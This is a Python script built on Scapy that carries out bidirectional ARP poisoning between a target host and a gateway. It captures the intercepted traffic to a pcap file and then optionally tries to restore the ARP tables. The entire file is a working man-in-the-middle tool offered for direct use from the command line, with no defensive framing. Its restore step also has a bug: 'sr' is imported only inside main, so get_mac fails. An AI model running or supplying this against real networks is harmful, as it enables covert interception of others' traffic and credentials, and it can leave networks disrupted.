# arp_poisoning.py
from scapy.all import ARP, send, sniff, wrpcap, get_if_hwaddr, Ether
import sys
import threading
import time

def poison(target_ip, spoof_ip):
    """Send one-way ARP poison packet."""
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

def arp_poison_bidirectional(target_ip, gateway_ip, duration=30):
    """Perform ARP poisoning in both directions."""
    print(f"[*] Starting bidirectional ARP poisoning between {target_ip} and {gateway_ip} for {duration} seconds...")

    def poison_loop():
        end_time = time.time() + duration
        while time.time() < end_time:
            poison(target_ip, gateway_ip)
            poison(gateway_ip, target_ip)
            time.sleep(2)

    poison_thread = threading.Thread(target=poison_loop)
    poison_thread.daemon = True
    poison_thread.start()
    return poison_thread

def capture_packets(interface, target_ip, gateway_ip, duration=30, pcap_file="arp_poison_capture.pcap"):
    """Capture traffic involving the target and gateway."""
    print(f"[*] Sniffing packets for {duration} seconds... Saving to {pcap_file}")
    filter_exp = f"host {target_ip} or host {gateway_ip}"
    packets = sniff(filter=filter_exp, iface=interface, timeout=duration)
    wrpcap(pcap_file, packets)
    print(f"[+] Packets saved to {pcap_file}")
    return pcap_file

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """Restore correct ARP entries after poisoning."""
    print("[*] Restoring ARP tables...")

    # Send correct mappings to both parties
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac, hwdst=target_mac), count=3, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac, hwdst=gateway_mac), count=3, verbose=False)

    print("[+] ARP tables restored.")

def get_mac(ip):
    """Resolve MAC address using ARP request."""
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=False)
    for sent, received in ans:
        return received.hwsrc
    return None

def main():
    if len(sys.argv) < 4:
        print("Usage: python arp_poisoning.py <target_ip> <gateway_ip> <interface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    poison_thread = arp_poison_bidirectional(target_ip, gateway_ip, duration=30)
    pcap_file = capture_packets(interface, target_ip, gateway_ip, duration=30)
    poison_thread.join()

    print(f"[+] ARP poisoning and packet capture completed.")
    print(f"[+] PCAP saved to: {pcap_file}")

    choice = input("Do you want to restore the ARP tables? (yes/no): ").strip().lower()
    if choice in ['yes', 'y']:
        from scapy.all import sr  # Only if user chooses restore
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if target_mac and gateway_mac:
            restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        else:
            print("[-] Could not resolve MAC addresses. Skipping ARP restoration.")
    else:
        print("[*] ARP tables not restored. Network may remain poisoned.")

if __name__ == '__main__':
    main()
